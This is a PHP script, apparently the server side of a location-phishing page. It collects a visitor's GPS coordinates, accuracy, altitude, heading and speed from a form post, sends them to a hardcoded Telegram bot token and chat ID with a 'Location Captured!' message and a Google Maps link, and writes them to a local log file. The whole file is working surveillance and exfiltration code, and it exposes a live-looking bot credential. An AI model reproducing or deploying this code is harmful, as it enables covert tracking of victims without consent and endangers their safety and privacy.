<?php
header('Content-Type: text/html');

// --- YOUR CONFIG ---
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId = "6862649950";

// 1. Capture Data
$lat = $_POST['Lat']; $lon = $_POST['Lon']; $acc = $_POST['Acc'];
$alt = $_POST['Alt']; $dir = $_POST['Dir']; $spd = $_POST['Spd'];

// 2. Format Telegram Message
$maps = "https://www.google.com/maps/place/$lat+$lon";
$msg = "*Location Captured!* \n\n" .
       "Lat: $lat\nLon: $lon\nAcc: $acc m\n" .
       "Alt: $alt\nDir: $dir\nSpd: $spd\n\n" .
       "[View on Google Maps]($maps)";

// 3. Send to Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
file_get_contents($url);

// 4. Save Locally
$data = array('lat'=>$lat, 'lon'=>$lon, 'acc'=>$acc, 'alt'=>$alt, 'dir'=>$dir, 'spd'=>$spd);
$f = fopen('../../logs/result.txt', 'w+');
fwrite($f, json_encode($data));
fclose($f);
?>
